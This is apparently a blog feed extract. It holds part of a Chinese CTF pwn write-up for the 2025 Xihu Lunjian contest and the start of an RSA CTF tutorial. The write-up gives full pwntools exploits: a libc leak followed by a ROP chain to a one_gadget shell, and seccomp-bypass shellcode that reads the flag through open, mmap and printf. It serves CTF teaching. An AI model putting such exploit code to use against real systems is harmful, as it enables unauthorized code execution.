class="string">&#x27;hex_low&#x27;</span>,<span class="built_in">hex</span>(low))</span><br><span class="line">        start_main_addr = <span class="built_in">hex</span>(high)+<span class="built_in">hex</span>(low)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">return</span> start_main_addr</span><br></pre></td></tr></table></figure><p><img src="/2025/01/19/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/image-20250118170436235.png" alt="image-20250118170436235"></p><ul><li>这时泄露之后，我们就可以想办法修改返回值通过计算<code>0x20</code>和<code>v8</code>字节数组的偏移，就可以发现，<code>v8+0x20*4</code>所在的地址比返回地址高，这时我们就可以使用<code>pop</code>操作，将栈上的数据弹出一点。（也可以使用edit编辑栈上数据），使得我们可以修改返回地址</li></ul><p><img src="/2025/01/19/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/image-20250118170141070.png" alt="image-20250118170141070"></p><ul><li>可以修改返回地址后，我们就可以布置rop链，这里我使用打<code>ogg</code>的方法</li></ul><p>![image-20250118170538001](CTFblog/write up系列blog/2025年西湖论剑线上赛/image-20250118170538001.png)</p><ul><li>这时发现<code>r12</code>和<code>r13</code>这个寄存器并不是<code>NULL</code>，还有一点很重要<code>rbp</code>指针在最后<code>leave</code>的时候会变成1导致<code>rbp-0x48</code>不可写,这时还要构造rop链修改<code>rbp</code>为<code>.bss</code>段上的合适的地址，再修改<code>r12</code>和<code>r13</code>指针为<code>NULL</code></li></ul><p><img src="/2025/01/19/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/image-20250118170659791.png" alt="image-20250118170659791"></p><ul><li>通过<code>libc</code>文件和程序文件寻找到<code>rop</code>链最后执行到<code>ogg</code>，即可getshell，注意在<code>push</code>操作的时候还要注意将Python中的整型，通过转换转为<code>int32</code>类型的数据，对于该题目<code>canary</code>如存在，算是已经在修改索引的时候绕过了</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">change2</span>(<span class="params">low</span>):</span><br><span class="line">    <span class="keyword">if</span> low[<span class="number">2</span>]==<span class="string">&#x27;8&#x27;</span> <span class="keyword">or</span>  low[<span class="number">2</span>]==<span class="string">&#x27;9&#x27;</span> <span class="keyword">or</span> low[<span class="number">2</span>]==<span class="string">&#x27;a&#x27;</span> <span class="keyword">or</span> low[<span class="number">2</span>]==<span class="string">&#x27;b&#x27;</span> <span class="keyword">or</span> low[<span class="number">2</span>]==<span class="string">&#x27;c&#x27;</span> <span class="keyword">or</span> low[<span class="number">2</span>]==<span class="string">&#x27;d&#x27;</span> <span class="keyword">or</span> low[<span class="number">2</span>]==<span class="string">&#x27;e&#x27;</span> <span class="keyword">or</span> low[<span class="number">2</span>]==<span class="string">&#x27;f&#x27;</span>:</span><br><span class="line">        low = <span class="built_in">int</span>(low, <span class="number">16</span>)</span><br><span class="line">        low &gt;= <span class="number">0x80000000</span></span><br><span class="line">        low -= <span class="number">0x100000000</span>  <span class="comment"># 补码转换为负数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        low = <span class="built_in">int</span>(low,<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> low</span><br></pre></td></tr></table></figure><h3 id="exp"><a class="markdownIt-Anchor" href="#exp"></a> exp</h3><ul><li>最终的exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;139.155.126.78&#x27;,28151)</span></span><br><span class="line">p = process(<span class="string">&#x27;Vpwn&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">push</span>(<span class="params">value</span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(value).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pop</span>():</span><br><span class="line">    p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print1</span>():</span><br><span class="line">    p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">low,high</span>):</span><br><span class="line">    <span class="keyword">if</span> low &lt; <span class="number">0</span>:</span><br><span class="line">        low =<span class="built_in">hex</span>((low + (<span class="number">1</span> &lt;&lt; <span class="number">32</span>)) % (<span class="number">1</span> &lt;&lt; <span class="number">32</span>))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;hex_low&#x27;</span>,low)</span><br><span class="line">        start_main_addr = <span class="built_in">hex</span>(high)+low[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;hex_low&#x27;</span>,<span class="built_in">hex</span>(low))</span><br><span class="line">        start_main_addr = <span class="built_in">hex</span>(high)+<span class="built_in">hex</span>(low)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">return</span> start_main_addr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change2</span>(<span class="params">low</span>):   </span><br><span class="line">    <span class="keyword">if</span> low[<span class="number">2</span>]==<span class="string">&#x27;8&#x27;</span> <span class="keyword">or</span>  low[<span class="number">2</span>]==<span class="string">&#x27;9&#x27;</span> <span class="keyword">or</span> low[<span class="number">2</span>]==<span class="string">&#x27;a&#x27;</span> <span class="keyword">or</span> low[<span class="number">2</span>]==<span class="string">&#x27;b&#x27;</span> <span class="keyword">or</span> low[<span class="number">2</span>]==<span class="string">&#x27;c&#x27;</span> <span class="keyword">or</span> low[<span class="number">2</span>]==<span class="string">&#x27;d&#x27;</span> <span class="keyword">or</span> low[<span class="number">2</span>]==<span class="string">&#x27;e&#x27;</span> <span class="keyword">or</span> low[<span class="number">2</span>]==<span class="string">&#x27;f&#x27;</span>:</span><br><span class="line">        low = <span class="built_in">int</span>(low, <span class="number">16</span>)</span><br><span class="line">        low &gt;= <span class="number">0x80000000</span></span><br><span class="line">        low -= <span class="number">0x100000000</span>  <span class="comment"># 补码转换为负数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        low = <span class="built_in">int</span>(low,<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> low</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    push(<span class="number">0x20</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">print1()</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Enter your choice: StackVector contents: &#x27;</span>)</span><br><span class="line">leak = p.recv().decode(<span class="string">&#x27;utf-8&#x27;</span>).split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(leak))</span><br><span class="line">high = leak[<span class="number">19</span>]</span><br><span class="line">low = leak[<span class="number">18</span>]</span><br><span class="line">pro_high = leak[<span class="number">23</span>]</span><br><span class="line">pro_low =  leak[<span class="number">22</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;leak------&gt;&#x27;</span>,leak)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;leak_high---&gt;&#x27;</span>,high)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;leak_low----&gt;&#x27;</span>,low)</span><br><span class="line">high = <span class="built_in">int</span>(high,<span class="number">10</span>)</span><br><span class="line">low = <span class="built_in">int</span>(low,<span class="number">10</span>)</span><br><span class="line">pro_high = <span class="built_in">int</span>(pro_high,<span class="number">10</span>)</span><br><span class="line">pro_low = <span class="built_in">int</span>(pro_low,<span class="number">10</span>)</span><br><span class="line">start_main_addr = change(low,high)</span><br><span class="line">start_pro_addr = change(pro_low,pro_high)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;hex_high&#x27;</span>,<span class="built_in">hex</span>(high))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;start_main_addr&#x27;</span>,start_main_addr)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;pro_addr&#x27;</span>,start_pro_addr)</span><br><span class="line">pro_addr = <span class="built_in">int</span>(start_pro_addr,<span class="number">16</span>)-<span class="number">0x1329</span></span><br><span class="line">bss_addr = pro_addr+<span class="number">0x42AE</span>+<span class="number">0x600</span></span><br><span class="line">start_main_addr = <span class="built_in">int</span>(start_main_addr,<span class="number">16</span>)</span><br><span class="line">libc_addr = start_main_addr -<span class="number">128</span> - <span class="number">0x29D10</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>-<span class="number">2</span>):</span><br><span class="line">    pop()</span><br><span class="line">ong_gadget = [libc_addr+<span class="number">0xebce2</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(ong_gadget[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># pop_rbp</span></span><br><span class="line">low = <span class="string">&#x27;0x&#x27;</span>+<span class="built_in">hex</span>(pro_addr+<span class="number">0x1313</span>)[<span class="number">6</span>:]</span><br><span class="line">high = <span class="built_in">hex</span>(pro_addr+<span class="number">0x1313</span>)[<span class="number">0</span>:<span class="number">6</span>]</span><br><span class="line">low = change2(low)</span><br><span class="line">push(low)</span><br><span class="line">push(<span class="built_in">int</span>(high,<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># bss_addr</span></span><br><span class="line">low = <span class="string">&#x27;0x&#x27;</span>+<span class="built_in">hex</span>(bss_addr)[<span class="number">6</span>:]</span><br><span class="line">high = <span class="built_in">hex</span>(bss_addr)[<span class="number">0</span>:<span class="number">6</span>]</span><br><span class="line">low = change2(low)</span><br><span class="line">push(low)</span><br><span class="line">push(<span class="built_in">int</span>(high,<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># pop_r12_r13</span></span><br><span class="line">pop_r12 = libc_addr+<span class="number">0x41c48</span></span><br><span class="line">low = <span class="string">&#x27;0x&#x27;</span>+<span class="built_in">hex</span>(pop_r12)[<span class="number">6</span>:]</span><br><span class="line">high = <span class="built_in">hex</span>(pop_r12)[<span class="number">0</span>:<span class="number">6</span>]</span><br><span class="line">low = change2(low)</span><br><span class="line">push(low)</span><br><span class="line">push(<span class="built_in">int</span>(high,<span class="number">16</span>))</span><br><span class="line">push(<span class="number">0</span>)</span><br><span class="line">push(<span class="number">0</span>)</span><br><span class="line">push(<span class="number">0</span>)</span><br><span class="line">push(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#ret</span></span><br><span class="line">low = <span class="string">&#x27;0x&#x27;</span>+<span class="built_in">hex</span>(pro_addr+<span class="number">0x101a</span>)[<span class="number">6</span>:]</span><br><span class="line">high = <span class="built_in">hex</span>(pro_addr+<span class="number">0x101a</span>)[<span class="number">0</span>:<span class="number">6</span>]</span><br><span class="line">low = change2(low)</span><br><span class="line">push(low)</span><br><span class="line">push(<span class="built_in">int</span>(high,<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ogg</span></span><br><span class="line">low = <span class="string">&#x27;0x&#x27;</span>+<span class="built_in">hex</span>(ong_gadget[<span class="number">0</span>])[<span class="number">6</span>:]</span><br><span class="line">high = <span class="built_in">hex</span>(ong_gadget[<span class="number">0</span>])[<span class="number">0</span>:<span class="number">6</span>]</span><br><span class="line">low = change2(low)</span><br><span class="line">push(low)</span><br><span class="line">push(<span class="built_in">int</span>(high,<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="heavens-door"><a class="markdownIt-Anchor" href="#heavens-door"></a> Heaven’s door</h2><h3 id="heavens-door_分析1"><a class="markdownIt-Anchor" href="#heavens-door_分析1"></a> Heaven’s door_分析1</h3><ul><li>先查看一下保护机制，发现有栈溢出保护，但是没有开PIE</li></ul><p><img src="/2025/01/19/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/image-20250118174120447.png" alt="image-20250118174120447"></p><ul><li>现在使用IDA进行逆向分析，一打开程序，发现是一题沙箱题，显然要写<code>shellcode</code></li></ul><p><img src="/2025/01/19/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/image-20250118174349041.png" alt="image-20250118174349041"></p><ul><li>现在就来查看一下<code>sandbox</code>,发现是一个白名单沙箱，只允许用如下的系统调用。并且白名单中没有<code>read()</code>这个系统调用。</li></ul><p><img src="/2025/01/19/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/image-20250118174453621.png" alt="image-20250118174453621"></p><ul><li>现在继续回来分析源代码，该程序通过创建子进程，将程序分成两个任务，子进程主要完成的就是执行<code>shellcode</code>的任务，而父进程是随机输出字符串数组中的某个字符串，一共会输出14次，所以并不需要考虑父进程的操作。</li></ul><p><img src="/2025/01/19/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/image-20250118174622810.png" alt="image-20250118174622810"></p><ul><li>现在主要分析子进程，子进程会开辟一段内存空间，然后让我们输入<code>0xC3</code>范围内的数据，并对数据进行检查，检查之后开启沙箱，开启完执行我们所输入的数据。</li></ul><p><img src="/2025/01/19/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/image-20250118174927785.png" alt="image-20250118174927785"></p><ul><li>现在来查看一下<code>count_syscall_instructions</code>会检查什么，该函数是检查是否有<code>15 5</code>两个是否相邻的个数。其实<code>15 5</code>这个字节码就是<code>syscall</code>这个系统调用的字节码，该函数的功能就是检查<code>syscall</code>的数量</li><li>会返回该<code>shellcode</code>中<code>syscall</code>的个数，如果大于2个就会退出程序（在main函数的操作）</li></ul><p><img src="/2025/01/19/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/image-20250118175114480.png" alt="image-20250118175114480"></p><ul><li>这时我们编写shellcode就要考虑以下几点：<ul><li>白名单没有<code>read()</code>这个函数，所以要另外寻找其他的系统调用，将flag放入内存中</li><li>程序限制<code>syscall</code>只能两次。</li></ul></li></ul><h3 id="heavens-door_分析2"><a class="markdownIt-Anchor" href="#heavens-door_分析2"></a> Heaven’s door_分析2</h3><ul><li>这时对于<code>read()</code>我们可以使用沙箱名单的<code>mmap</code>系统调用进行代替，将文件映射到内存中。</li><li>对于<code>syscall</code>的限制，这两次<code>syscall</code>必须要用来<code>open</code>flag文件，然后调用<code>mmap</code>将该文件映射到内存中。</li><li>对于如何将<code>flag</code>输出出来，父程序有稍微提示一点，由于没有开启pie地址，我们还可以调用<code>printf()</code>函数，或者<code>puts()</code>函数将flag输出出来。所以我们就可以写如下shellcode</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mov rbx,<span class="number">0x000067616c662f2e</span></span><br><span class="line">push rbx</span><br><span class="line">mov rdi,rsp</span><br><span class="line">mov rsi,<span class="number">0</span></span><br><span class="line">mov rax,<span class="number">0x2</span></span><br><span class="line">syscall<span class="comment"># 系统调用open打开flag文件</span></span><br><span class="line"></span><br><span class="line">mov rdi,<span class="number">0</span></span><br><span class="line">mov rsi,<span class="number">4096</span></span><br><span class="line">mov rdx,<span class="number">1</span></span><br><span class="line">mov r10,<span class="number">1</span></span><br><span class="line">mov r8,rax</span><br><span class="line">mov r9,<span class="number">0</span></span><br><span class="line">mov rax,<span class="number">0x9</span></span><br><span class="line">syscall   <span class="comment"># 系统调用mmap将文件映射到内存中</span></span><br><span class="line"></span><br><span class="line">mov rdi,rax</span><br><span class="line">mov rsi,<span class="number">0x401150</span></span><br><span class="line">call rsi <span class="comment"># call printf函数,将flag输出出来，并且避免第三次系统调用</span></span><br></pre></td></tr></table></figure><h3 id="exp"><a class="markdownIt-Anchor" href="#exp-2"></a> exp</h3><ul><li>完整exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;139.155.126.78&#x27;</span>,<span class="number">20476</span>)</span><br><span class="line"><span class="comment">#elf = ELF(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment">#func_address = elf.symbols[&#x27;printf&#x27;]</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">a = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rbx,0x000067616c662f2e</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    mov rdi,rsp</span></span><br><span class="line"><span class="string">    mov rsi,0</span></span><br><span class="line"><span class="string">    mov rax,0x2</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi,0</span></span><br><span class="line"><span class="string">    mov rsi,4096</span></span><br><span class="line"><span class="string">    mov rdx,1</span></span><br><span class="line"><span class="string">    mov r10,1</span></span><br><span class="line"><span class="string">    mov r8,rax</span></span><br><span class="line"><span class="string">    mov r9,0</span></span><br><span class="line"><span class="string">    mov rax,0x9</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi,rax</span></span><br><span class="line"><span class="string">    mov rsi,0x401150</span></span><br><span class="line"><span class="string">    call rsi</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line">payload = a</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2025/01/19/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/image-20250118180401133-1737216273013-27.png" alt="image-20250118180401133"></p><h3 id="非预期解"><a class="markdownIt-Anchor" href="#非预期解"></a> 非预期解</h3><ul><li><p>看到了这篇博客后才知道有非预期解：<a href="https://starrysky1004.github.io/2025/01/18/2025-xi-hu-lun-jian-pwn/2025-xi-hu-lun-jian-pwn/#toc-heading-2">2025西湖论剑-PWN | StarrySky</a></p></li><li><p><code>execeve</code>的系统调用竟然没有禁，可以直接<code>getshell</code></p></li></ul><p><img src="/2025/01/19/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/image-20250121231603694.png" alt="image-20250121231603694"></p>]]></content>
    
    
    <summary type="html">前言：打了一下西湖论剑，有一题4解的pwn没做出来QAQ</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="write-up" scheme="http://iyheart.github.io/categories/CTF/write-up/"/>
    
    
  </entry>
  
  <entry>
    <title>RSA加密常见题型总结</title>
    <link href="http://iyheart.github.io/2025/01/17/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/RSA%E5%8A%A0%E5%AF%86%E5%B8%B8%E8%A7%81%E9%A2%98%E5%9E%8B%E6%80%BB%E7%BB%93/"/>
    <id>http://iyheart.github.io/2025/01/17/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/RSA%E5%8A%A0%E5%AF%86%E5%B8%B8%E8%A7%81%E9%A2%98%E5%9E%8B%E6%80%BB%E7%BB%93/</id>
    <published>2025-01-16T16:57:32.000Z</published>
    <updated>2025-02-22T17:45:12.452Z</updated>
    
    <content type="html"><![CDATA[<ul><li>对于基础的RSA加密，我们只需要了解加密和解密过程，而不需要了解RSA加密这个理论是如何推导出来的（当然如果有数论基础的话可以这么干）。</li><li>先对RSA加密过程进行简单的介绍，基础题型基本上就是想办法求<code>p</code>或<code>q</code>，从而把<code>n</code>分解出来，这样解密就可以一葫芦画瓢了。</li></ul><h1 id="rsa加密原理"><a class="markdownIt-Anchor" href="#rsa加密原理"></a> rsa加密原理</h1><ul><li>明文为m，密文为c</li></ul><ol><li>找两个质数p、q</li><li>计算n=p*q</li><li>计算n的欧拉函数φ（n）=（p-1）*（q-1）</li><li>公钥e，要求1＜e＜φ（n），且e为整数，还需要e、φ（n）互质</li><li>确定私钥d，d要满足e*d除以φ（n）余数为1</li></ol><ul><li>加密</li></ul><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>密文</mtext><mi>c</mi><mtext>，</mtext><mi>c</mi><mo>=</mo><msup><mi>m</mi><mi>e</mi></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">密文c，c=m^e(mod n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">密</span><span class="mord cjk_fallback">文</span><span class="mord mathnormal">c</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></span></p><ul><li>解密</li></ul><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>明文</mtext><mi>m</mi><mtext>，</mtext><mi>m</mi><mo>=</mo><msup><mi>c</mi><mi>d</mi></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">明文m，m=c^d(modn)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">明</span><span class="mord cjk_fallback">文</span><span class="mord mathnormal">m</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.149108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></span></p><h1 id="解密rsa关键"><a class="markdownIt-Anchor" href="#解密rsa关键"></a> 解密rsa关键</h1><ul><li><p>公开传播的是：n、e、c</p></li><li><p>解密要用到：n、d、c</p></li><li><p>所以rsa解密的关键就是要得到私钥d</p></li><li><p>要得到d，需要通过e*d除以φ（n）余数为1</p></li><li><p>在求d之前就需要求φ（n）</p></li><li><p>而φ（n）=（p-1）*（q-1）</p></li><li><p>所以解密rsa的关键需要求p、q</p></li><li><p>n = p*q，可以通过分解质因素来对p、q进行爆破（当p、q比较小或者p、q比较接近的时候是可以分解的）</p></li><li><p>了解RSA加密和解密的过程后，接下来就对CTF的RSA基础题（差不多已经成为模版题了）进行归纳</p></li></ul><h1 id="常用结论"><a class="markdownIt-Anchor" href="#常用结论"></a> 常用结论</h1><ul><li>以下结论是在做题中比较经常用到的关于数论的一些结论。</li></ul><h1 